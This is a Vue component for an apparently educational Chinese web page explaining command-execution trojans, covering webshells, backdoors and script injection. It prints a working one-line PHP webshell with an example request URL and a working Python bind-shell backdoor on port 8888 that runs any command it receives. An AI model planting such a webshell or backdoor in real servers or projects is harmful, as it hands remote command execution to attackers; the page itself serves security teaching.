<template>
        <div>
          <el-row>
            <!-- 主要内容区域 -->
            <el-col :span="19">
              <div ref="containerRef" style="color: #fff; height: 650px; overflow-y: auto">
                <div id="part0" style="height: 100px;"></div>
                <div id="part2" style="height: auto;">
                  <el-text size="large" style="color:#fff; line-height: 3.6;">
                    <div id="p2" style="height: auto;">
                      <h1 class="title">命令执行木马</h1>
                      <el-divider />
                      <br>
      
                      <!-- 命令执行木马原理 -->
                      <h2 class="sub-title" id="p2-1">原理</h2>
                      <p>命令执行木马本质上是一种恶意程序,攻击者借助它能够在受感染的系统中执行任意命令.<br>
                        其核心攻击方式是利用目标系统或者应用程序存在的漏洞.<br>
                        当目标系统或应用程序在处理用户输入时,若未对输入进行严格的验证和过滤,攻击者就有机会将恶意代码混入合法的命令或程序里.
                      </p> <br>
      
                      <!-- 常见类型 -->
                      <h2 class="sub-title" id="p3">常见类型</h2>
                      <ul>
                        <li>
                          <h3 class="sub-sub-title" id="p3-1">Webshell 木马
                          </h3>
                          <p>Webshell
                            是极为常见的命令执行木马类型之一.它通常表现为一个脚本文件,常见的脚本语言有
                            PHP、ASP、JSP
                            等.攻击者会想方设法将这个脚本文件上传到目标 Web
                            服务器的可执行目录下.一旦上传成功,攻击者只需通过浏览器访问该脚本文件,就能够在浏览器中执行任意系统命令.
                          </p>
                          <p>以一个简单的 PHP Webshell 为例:</p>
                          <el-card style="max-width:750px; background-color:#161b22;"
                            body-style="line-height: 2">
                            <pre class="code-block">
          <span class="token delimiter">&lt;?php</span>
              <span class="token keyword">if</span> (<span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>) {
                  <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span>;
                  <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
              }
          <span class="token delimiter">?&gt;</span></pre>
                          </el-card>
                          <p>在这个脚本中,当攻击者访问该脚本并传递 <el-tag style="color:#a5d6ff;font-size: 14px;" type="info" size="large">cmd</el-tag>
                            参数时,脚本会将该参数作为系统命令执行.<br>
                            例如,攻击者可以通过访问
                            <el-tag style="color:#a5d6ff;font-size: 14px;" type="info" size="large">http://example.com/shell.php?cmd=ls -al</el-tag>
                            来列出当前目录下的所有文件和文件夹的详细信息.<br>
                          </p>
                        </li>
                        <br>
                        <li>
                          <h3 class="sub-sub-title" id="p3-2">后门程序木马</h3>
                          <p>后门程序是一种隐藏在系统中的恶意程序,它通常会在系统启动时自动运行,并监听特定的端口.<br>
                            攻击者可以通过网络连接到该端口,向后门程序发送命令,从而实现对受感染系统的控制.<br>                                                                                </p>
                          <p>以下是一个简单的 Python 后门程序示例:</p>
                          <el-card style="max-width:750px; background-color:#161b22;"
                            body-style="line-height: 2">
                            <pre class="code-block">
          <span class="token keyword">import</span> socket
          <span class="token keyword">import</span> subprocess
          
          <span class="token variable">server</span> <span class="token operator">=</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          <span class="token variable">server</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span>, 8888<span class="token punctuation">)</span><span class="token punctuation">)</span>
          <span class="token variable">server</span><span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span>1<span class="token punctuation">)</span>
          
          <span class="token keyword">while</span> <span class="token boolean">True</span>:
              <span class="token variable">conn</span>, <span class="token variable">addr</span> <span class="token operator">=</span> <span class="token variable">server</span><span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
              <span class="token variable">cmd</span> <span class="token operator">=</span> <span class="token variable">conn</span><span class="token punctuation">.</span><span class="token function">recv</span><span class="token punctuation">(</span>1024<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
              <span class="token variable">output</span> <span class="token operator">=</span> subprocess<span class="token punctuation">.</span><span class="token function">getoutput</span><span class="token punctuation">(</span><span class="token variable">cmd</span><span class="token punctuation">)</span>
              <span class="token variable">conn</span><span class="token punctuation">.</span><span class="token function">sendall</span><span class="token punctuation">(</span><span class="token variable">output</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
              <span class="token variable">conn</span><span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre>
                          </el-card>
                          <p>这个程序会监听 8888
                            端口,当有客户端连接时,它会接收客户端发送的命令并执行,然后将执行结果返回给客户端.<br>攻击者可以使用
                             <el-tag style="color:#a5d6ff;font-size: 14px;" type="info" size="large">nc</el-tag> 等工具连接到该端口并发送命令
                          </p>
                        </li>
                        <br>
                        <li>
                          <h3 class="sub-sub-title" id="p3-3">脚本注入木马</h3>
                          <p>脚本注入木马是利用网页应用程序对用户输入过滤不严的漏洞,将恶意脚本注入到网页中.<br>
                            当其他用户访问该网页时,恶意脚本会在用户的浏览器中执行,从而实现攻击者的目的.<br>常见的脚本注入方式有
                            <el-tag style="color:#ff7b72;font-size: 14px;" type="info" size="large">SQL 注入</el-tag>、<el-tag style="color:#ff7b72;font-size: 14px;" type="info" size="large">XSS注入</el-tag>等.</p>
                        </li>
                      </ul>
                      <br>
      
                      <div style="height: 300px;"></div>
                      
                    </div>
                  </el-text>
                </div>
              </div>
            </el-col>
            <!-- 目录 -->
            <el-col :span="5">
              <el-menu 
                :default-active="activeAnchor" 
                class="tech-anchor" 
                mode="vertical"
                @select="handleAnchorSelect"
              >
                <el-menu-item-group title="本页目录">
                  <el-menu-item index="p2">命令执行木马介绍</el-menu-item>
                  <el-menu-item index="p2-1">↳ 命令执行木马原理</el-menu-item>
                  <el-menu-item index="p3">常见类型</el-menu-item>
                  <el-menu-item index="p3-1">↳ webshell</el-menu-item>
                  <el-menu-item index="p3-2">↳ 后门</el-menu-item>
                  <el-menu-item index="p3-3">↳ 脚本注入</el-menu-item>
                </el-menu-item-group>
              </el-menu>
            </el-col>
          </el-row>
        </div>
      </template>
      
      <script>
      export default {
        data() {
          return {
            containerRef: null,
            activeAnchor: 'p2'
          };
        },
        mounted() {
          this.containerRef = this.$refs.containerRef;
          window.addEventListener('scroll', this.handleScroll);
        },
        beforeDestroy() {
          window.removeEventListener('scroll', this.handleScroll);
        },
        methods: {
          handleClick(e) {
            e.preventDefault();
          },
          handleAnchorSelect(index) {
            this.activeAnchor = index;
            const element = document.getElementById(index);
            if (element) {
              element.scrollIntoView({ behavior: 'smooth' });
            }
          },
          handleScroll() {
            const sections = ['p2', 'p2-1', 'p3', 'p3-1', 'p3-2', 'p3-3'];
            const scrollPosition = window.scrollY || document.documentElement.scrollTop;
            
            for (let i = sections.length - 1; i >= 0; i--) {
              const section = document.getElementById(sections[i]);
              if (section && scrollPosition >= section.offsetTop - 100) {
                this.activeAnchor = sections[i];
                break;
              }
            }
          }
        }
      };
      </script>
      
      <style lang="less">
      @import '~element-ui/lib/theme-chalk/index.css';
::-webkit-scrollbar {
  display: none;
}
      code {
        font-family: "Cascadia Code";
      }
      
      .code-block {
        color: #c9d1d9;
        font-family: 'Cascadia Code', Consolas, 'Liberation Mono', Menlo, monospace;
        font-size: 15px;
        margin: 0;
      }
      
      .token.comment {
        color: #8b949e;
      }
      
      .token.keyword {
        color: #ff7b72;
      }
      
      .token.function {
        color: #d2a8ff;
      }
      
      .token.variable {
        color: #79c0ff;
      }
      
      .token.string {
        color: #a5d6ff;
      }
      
      .token.punctuation {
        color: #c9d1d9;
      }
      
      .token.operator {
        color: #ff7b72;
      }
      
      .token.delimiter {
        color: #ff7b72;
      }
      
      /* Card styling */
      .el-card {
        border: 1px solid #30363d;
        margin: 10px 0;
      }
      
      /* Menu styling */
      .tech-anchor {
        position: fixed;
        right: 20px;
        background-color: #0d1117;
        padding: 15px;
        border-radius: 6px;
        border: 1px solid #30363d;
        width: 220px;
        
        .el-menu-item-group__title {
          padding: 10px 0 5px 20px;
          color: #d1e7ff !important;
          font-family: 'Cascadia Code', '微软雅黑';
          font-size: 1em;
          border-bottom: 1px solid rgba(0, 123, 255, 0.3);
          text-shadow: 0 0 5px rgba(0, 123, 255, 0.5);
        }
        
        .el-menu-item {
          color: #a0c4ff !important;
          font-family: 'Cascadia Code', '微软雅黑';
          font-size: 0.9em;
          height: 36px;
          line-height: 36px;
          padding: 0 10px !important;
          margin: 5px 0;
          border-radius: 3px;
          transition: all 0.3s ease;
          
          &:hover {
            color: #ffffff !important;
            background: rgba(0, 123, 255, 0.2);
            text-shadow: 0 0 5px #007bff;
            transform: translateX(5px);
          }
          
          &.is-active {
            color: #ffffff !important;
            background: rgba(0, 123, 255, 0.3);
            text-shadow: 0 0 10px #00a2ff;
            border-left: 2px solid #007bff;
            padding-left: 15px !important;
            animation: pulse-glow 2s infinite alternate;
          }
        }
      }
      
      .tech-submit-btn {
        /* 基础样式 */
        border: none;
        padding: 12px 24px;
        font-weight: bold;
        letter-spacing: 1px;
        text-transform: uppercase;
        position: relative;
        overflow: hidden;
        transition: all 0.3s ease;
      
        /* 确保按钮内容居中 */
        display: inline-flex;
        align-items: center;
        justify-content: center;
      
        /* 渐变背景 - 科技蓝 */
        background: linear-gradient(135deg, #00a1ff 0%, #0066ff 50%, #0033cc 100%);
      
        /* 文字和图标颜色 */
        color: white !important;
      
        /* 圆角 - 使用round属性已设置 */
      
        /* 阴影 - 外发光效果 */
        box-shadow: 0 0 10px rgba(0, 150, 255, 0.5),
              0 0 20px rgba(0, 100, 255, 0.3),
              inset 0 0 5px rgba(255, 255, 255, 0.2);
      
        &:hover {
          /* 悬停时增强发光效果 */
          box-shadow: 0 0 15px rgba(0, 150, 255, 0.8),
                0 0 30px rgba(0, 100, 255, 0.5),
                inset 0 0 10px rgba(255, 255, 255, 0.3);
      
          /* 悬停时轻微放大 */
          transform: scale(1.05);
      
          /* 悬停时改变渐变角度 */
          background: linear-gradient(135deg, #00a1ff 0%, #0066ff 50%, #0033cc 100%);
        }
      
        &:active {
          /* 点击时效果 */
          transform: scale(0.98);
          box-shadow: 0 0 5px rgba(0, 150, 255, 0.8),
                inset 0 0 10px rgba(0, 0, 0, 0.3);
        }
      
        &::before {
          /* 创建光效层 */
          content: '';
          position: absolute;
          top: -50%;
          left: -50%;
          width: 200%;
          height: 200%;
          background: linear-gradient(to bottom right,
                  rgba(255, 255, 255, 0) 0%,
                  rgba(255, 255, 255, 0.1) 50%,
                  rgba(255, 255, 255, 0) 100%);
          transform: rotate(45deg);
          animation: shine 3s infinite;
          opacity: 0;
        }
      
        &:hover::before {
          opacity: 1;
        }
      }
      
      .btn-content {
        position: relative;
        z-index: 1;
        display: flex;
        align-items: center;
        justify-content: center;
        width: 100%;
        /* 确保内容区域占满整个按钮 */
      }
      
      .btn-icon {
        font-size: 16px;
        transition: all 0.3s ease;
        margin-right: 0px;
        /* 用margin替代gap确保更好的兼容性 */
      }
      
      .btn-text {
        transition: all 0.3s ease;
      }
      
      .tech-submit-btn:hover .btn-icon {
        transform: translateY(-2px);
      }
      
      @keyframes shine {
        0% {
          left: -50%;
          top: -50%;
        }
      
        20% {
          left: 100%;
          top: 100%;
        }
      
        100% {
          left: 100%;
          top: 100%;
        }
      }
      
      h1.title {
        margin: 0 0 3rem;
        font-size: 38px;
        line-height: 1.4;
        letter-spacing: -.02em;
        font-weight: 800;
        text-align: left;
        font-family: 'Orbitron', '微软雅黑';
      }
      
      h2.sub-title {
        margin: 0 0 3rem;
        font-size: 25px;
        line-height: 1.4;
        letter-spacing: -.02em;
        font-weight: 800;
        text-align: left;
        font-family: 'Orbitron', '微软雅黑';
      }
      
      h3.sub-sub-title {
        margin: 0 0 3rem;
        font-size: 20px;
        line-height: 1.4;
        letter-spacing: -.02em;
        font-weight: 800;
        text-align: left;
        font-family: 'Orbitron', '微软雅黑';
      }
      
      /* 特殊定义的变量,比如PHP.EOL */
      .v {
        color: #4cbcec;
        font-family: 'Cascadia Code';
      }
      
      /* 关键词与运算符,比如function,+-* */
      .key {
        color: #e1567b;
        font-family: 'Cascadia Code';
      }
      
      /* 第1层{[()]} */
      .lev0 {
        color: #f0de18;
        font-family: 'Cascadia Code';
      }
      
      /* 第2层{[()]} */
      .lev1 {
        color: rgb(238, 65, 195);
        font-family: 'Cascadia Code';
      }
      
      /* 第3层{[()]} */
      .lev2 {
        color: #239af5;
        font-family: 'Cascadia Code';
      }
      
      /* 函数名 */
      .func {
        color: #84D49C;
        /* color:#434040 */
        font-family: 'Cascadia Code';
      }
      
      .txt {
        font-family: 'Cascadia Code';
      }
      
      /* 所有代码的基底,普通变量,超全局变量,标点符号'",; */
      .code {
        color: #fff;
        font-family: 'Cascadia Code';
      }
      
      /* 表示注释 */
      .cmt {
        color: rgb(99, 97, 97);
        font-family: 'Cascadia Code';
        font-size: 15px
      }
      
      /* 表示数字 */
      .num {
        color: #b891d8;
        font-family: 'Cascadia Code';
      }
      
      /* el-tag 样式 */
      .el-tag {
        background-color: #3d3b3b;
        color: #fff;
        border-color: #282C34;
      }
      
      /* el-card 样式 */
      .el-card {
        background-color: #282C34;
        color: #fff;
        border-color: #282C34;
      }
      
      /* el-text 样式 */
      .el-text {
        color: #fff;
      }
      
      /* 响应式调整 */
      @media (max-width: 768px) {
        .tech-anchor {
          padding: 10px;
          width: 180px;
        }
      }
      
      @keyframes pulse-glow {
        0% {
          box-shadow: 0 0 5px rgba(0, 162, 255, 0.5);
        }
        100% {
          box-shadow: 0 0 20px rgba(0, 162, 255, 0.8);
        }
      }
      
      @keyframes blink-caret {
        50% {
          opacity: 1;
        }
      }
      </style>